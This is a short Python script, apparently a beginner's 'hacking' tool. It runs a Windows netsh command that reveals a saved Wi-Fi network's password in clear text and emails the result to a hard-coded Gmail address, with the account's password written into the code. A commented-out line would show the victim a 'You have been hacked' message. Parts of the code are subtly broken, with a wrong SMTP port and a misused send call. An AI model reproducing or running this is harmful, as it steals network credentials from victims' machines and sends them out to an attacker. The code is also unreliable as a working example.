import subprocess, smtplib


def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 535)
    server.starttls()
    server.login(email, password)
    server.send(email, email, message)
    server.quit()

command = "netsh wlan show profile UPC723762 key=clear"
result = subprocess.check_output(command, shell=True)
send_mail("relaquantisten@gmail.com", "genio123890", result)
#command = "msg * You have been hacked"
#subprocess.Popen(command, shell=True)